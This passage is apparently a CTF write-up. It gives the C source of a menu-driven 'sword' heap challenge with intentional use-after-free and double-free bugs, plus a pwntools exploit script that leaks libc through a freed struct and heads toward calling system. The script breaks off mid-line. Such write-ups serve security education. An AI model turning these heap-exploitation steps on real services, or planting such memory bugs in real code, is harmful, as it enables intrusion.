class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SWORD_NUM6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_INT_BUF_LEN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SWORD_LEN0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FORGE_TIME2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALARM_TIME30</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_s</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> name_len;</span><br><span class="line"><span class="keyword">int</span> weight;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *sword_name;</span><br><span class="line"><span class="keyword">void</span> (*use_sword)(<span class="keyword">char</span> *ptr);</span><br><span class="line"><span class="keyword">int</span> is_hardened;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_list_s</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> is_used;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_s</span> *<span class="title">sword</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_list_s</span> <span class="title">sword_lists</span>[<span class="title">MAX_SWORD_NUM</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"/* Welcome! */\n"</span></span><br><span class="line">   <span class="string">"1. Forge a sword.\n"</span></span><br><span class="line">   <span class="string">"2. Synthesise two sword.\n"</span></span><br><span class="line">   <span class="string">"3. Show a sword.\n"</span></span><br><span class="line">   <span class="string">"4. Destroy a sword.\n"</span></span><br><span class="line">   <span class="string">"5. Harden a sword.\n"</span></span><br><span class="line">   <span class="string">"6. Equip a sword.\n"</span></span><br><span class="line">   <span class="string">"7. Quit.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the sword?\n"</span>);</span><br><span class="line">slot = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot &lt; <span class="number">0</span> || slot &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot].is_used) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sword_lists[slot].is_used = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *name = sword_lists[slot].sword-&gt;sword_name;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(sword_lists[slot].sword);</span><br><span class="line"><span class="built_in">free</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_int</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[READ_INT_BUF_LEN];</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; (read(STDIN_FILENO, &amp;ch, <span class="number">1</span>), ch) != <span class="string">'\n'</span> &amp;&amp;</span><br><span class="line">i &lt; READ_INT_BUF_LEN - <span class="number">1</span> &amp;&amp; ch != <span class="number">-1</span>; i++) &#123;</span><br><span class="line">str[i] = ch;</span><br><span class="line">&#125;</span><br><span class="line">str[i] = '\x00';</span><br><span class="line"><span class="keyword">return</span> atoi(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pick_sword_free_slot</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAX_SWORD_NUM; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (!sword_lists[i].is_used) &#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the sword?\n"</span>);</span><br><span class="line">slot = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot &lt; <span class="number">0</span> || slot &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot].is_used) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sword_lists[slot].is_used == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Haha!!! There is a hacker!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The weight is %u\n"</span>,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sword_lists[slot].sword-&gt;weight);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The name is %s\n"</span>, sword_lists[slot].sword-&gt;sword_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hoo</span><span class="params">(<span class="keyword">char</span> *name)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I use sword %s..... It's so cooool!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">harden_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the sword?\n"</span>);</span><br><span class="line">slot = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot &lt; <span class="number">0</span> || slot &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot].is_used) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sword_lists[slot].sword-&gt;is_hardened) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This sword is already hardened!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the length of the sword name?\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get name_len. */</span></span><br><span class="line"><span class="keyword">int</span> len = get_int();</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Oh no there is a hacker!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt; MAX_SWORD_LEN) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The name is too long.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(sword_lists[slot].sword);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sword_lists[slot].sword-&gt;name_len = len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get sword name. */</span></span><br><span class="line">sword_lists[slot].sword-&gt;sword_name = <span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sword_lists[slot].sword-&gt;sword_name) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc() returned NULL. Out of Memory\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Plz input the sword name.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; (read(STDIN_FILENO, &amp;ch, <span class="number">1</span>), ch) != <span class="string">'\n'</span> &amp;&amp;</span><br><span class="line">i &lt; len &amp;&amp; ch != <span class="number">-1</span>; i++) &#123;</span><br><span class="line">sword_lists[slot].sword-&gt;sword_name[i] = ch;</span><br><span class="line">&#125;</span><br><span class="line">sword_lists[slot].sword-&gt;sword_name[i] = '\x00';</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get sword weight. */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the weight of the sword?\n"</span>);</span><br><span class="line"><span class="keyword">int</span> weight = get_int();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OK....Plz wait for forging the sword..........\n"</span>);</span><br><span class="line">sleep((weight + <span class="number">1</span>) * <span class="number">10000000</span>);</span><br><span class="line"></span><br><span class="line">sword_lists[slot].sword-&gt;weight = weight;</span><br><span class="line">sword_lists[slot].sword-&gt;use_sword = hoo;</span><br><span class="line">sword_lists[slot].sword-&gt;is_hardened = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">equip_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the sword?\n"</span>);</span><br><span class="line">slot = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot &lt; <span class="number">0</span> || slot &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot].sword) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Apparently there should be system('/bin/sh'). */</span></span><br><span class="line">(sword_lists[slot].sword-&gt;use_sword)(sword_lists[slot].sword-&gt;sword_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Vuln. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">synthe_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot_1, slot_2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the first sword?\n"</span>);</span><br><span class="line">slot_1 = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot_1 &lt; <span class="number">0</span> || slot_1 &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot_1].is_used) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What's the index of the second sword?\n"</span>);</span><br><span class="line">slot_2 = get_int();</span><br><span class="line"><span class="keyword">if</span> (slot_2 &lt; <span class="number">0</span> || slot_2 &gt;= MAX_SWORD_NUM ||</span><br><span class="line">!sword_lists[slot_2].is_used) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I don't trust your number!!!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OK.... Forge two swords now!!\n"</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_list_s</span> <span class="title">sword1_list</span> = <span class="title">sword_lists</span>[<span class="title">slot_1</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sword_list_s</span> <span class="title">sword2_list</span> = <span class="title">sword_lists</span>[<span class="title">slot_2</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two swords are lost. */</span></span><br><span class="line">sword1_list.is_used = sword2_list.is_used = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sleep(FORGE_TIME);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Combinne two names together. */</span></span><br><span class="line">sword2_list.sword-&gt;sword_name = <span class="built_in">realloc</span>(sword2_list.sword-&gt;sword_name,</span><br><span class="line">sword1_list.sword-&gt;name_len + sword2_list.sword-&gt;name_len + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!sword2_list.sword-&gt;sword_name) &#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(sword2_list.sword-&gt;sword_name + sword2_list.sword-&gt;name_len,</span><br><span class="line">sword1_list.sword-&gt;sword_name, sword1_list.sword-&gt;name_len);</span><br><span class="line"></span><br><span class="line">sword2_list.sword-&gt;name_len += sword1_list.sword-&gt;name_len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* New sword is created. */</span></span><br><span class="line">sword2_list.is_used = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clear the first sword. */</span></span><br><span class="line"><span class="built_in">free</span>(sword1_list.sword-&gt;sword_name); <span class="comment">//UAF 点</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"YOu have the NEW sword!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_sword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> slot = pick_sword_free_slot();</span><br><span class="line"><span class="keyword">if</span> (slot == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Oh my! There are no slot for new swords!\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sword_lists[slot].sword = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct sword_s));</span><br><span class="line"><span class="keyword">if</span> (!sword_lists[slot].sword) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc() returned NULL. Out of Memory\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sword_lists[slot].is_used = <span class="number">1</span>;</span><br><span class="line">sword_lists[slot].sword-&gt;is_hardened = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New sword is forged ^_^. sword index is %d.\n"</span>, slot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">alarm_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Blade master is angry!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* If someone can print some ascii art, that should be better. */</span></span><br><span class="line"></span><br><span class="line">signal(SIGALRM, alarm_handler);</span><br><span class="line">alarm(ALARM_TIME);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[READ_INT_BUF_LEN];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">show_menu();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (read(STDIN_FILENO, buf, READ_INT_BUF_LEN) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> command = atoi(buf);</span><br><span class="line"><span class="keyword">switch</span> (command) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">create_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">synthe_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">show_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">free_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">harden_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">equip_sword();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Thank you!\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>write up</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Quit.\n'</span>)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'first sword?\n'</span>)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(<span class="string">'second sword?\n'</span>)</span><br><span class="line">    p.sendline(str(y))</span><br><span class="line">    p.recvuntil(<span class="string">'NEW sword!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equip</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'sword?\n'</span>)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(<span class="string">'so cooool!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'sword?\n'</span>)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harden</span><span class="params">(x, lenth, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'sword?\n'</span>)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">    p.sendline(str(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">'sword name.\n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">'weight of the sword?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'..........\n'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./sword'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">libc_start_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">hoo_addr = elf.symbols[<span class="string">'hoo'</span>]</span><br><span class="line"></span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="comment"># get the libc base</span></span><br><span class="line"><span class="comment"># create </span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">harden(<span class="number">0</span>,<span class="number">32</span>,<span class="string">'a'</span>*<span class="number">8</span>+p64(libc_start_got)+p64(hoo_addr))</span><br><span class="line"><span class="comment"># free</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># create</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">'sword?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'0\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'sword '</span>)</span><br><span class="line">libc_start_addr = u64(p.recvuntil(<span class="string">'cooool!\n'</span>)[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">libc_base = libc_start_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span 